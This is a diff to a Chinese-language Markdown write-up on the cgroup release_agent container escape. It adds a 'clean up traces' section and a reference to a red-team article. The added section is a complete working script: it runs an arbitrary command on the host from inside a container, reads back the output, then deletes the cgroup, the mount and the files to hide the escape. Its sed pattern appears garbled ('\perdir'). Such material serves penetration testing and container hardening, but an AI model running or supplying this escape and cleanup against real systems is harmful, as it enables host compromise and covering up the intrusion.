@@ -71,9 +71,32 @@ chmod a+x /tmp/host_tmp/cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
 
+## 清理痕迹
+1. 删除创建的子cgroup
+2. 取消/tmp下的cgroup挂载
+3. 删除/tmp/cgrp/空目录
+4. 删除/cmd文件
+5. 删除/output文件
+```shell
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "$1 > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+sleep 2
+cat /output
+rmdir /tmp/cgrp/x && umount /tmp/cgrp/ && rm -rf /output /cmd /tmp/cgrp
+```
+![](media/16330951806464/16337507086945.jpg)
+
+
 ## 参考文档
-1. https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt
-2. [cgroups(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cgroups.7.html)
-3. [PID/TID/TGID参考](https://www.cnblogs.com/wipan/p/9488318.html)
-4. [Docker存储驱动程序](https://docs.docker.com/storage/storagedriver/)
-5. [procs 和tasks 的区别](http://linux.laoqinren.net/posts/hierarchy-without-controller-group/#procs-%E5%92%8Ctasks-%E7%9A%84%E5%8C%BA%E5%88%AB)
+1. [红蓝对抗中的云原生漏洞挖掘及利用实录](https://security.tencent.com/index.php/blog/msg/183)
+2. https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt
+3. [cgroups(7) - Linux manual page](https://man7.org/linux/man-pages/man7/cgroups.7.html)
+4. [PID/TID/TGID参考](https://www.cnblogs.com/wipan/p/9488318.html)
+5. [Docker存储驱动程序](https://docs.docker.com/storage/storagedriver/)
+6. [procs 和tasks 的区别](http://linux.laoqinren.net/posts/hierarchy-without-controller-group/#procs-%E5%92%8Ctasks-%E7%9A%84%E5%8C%BA%E5%88%AB)
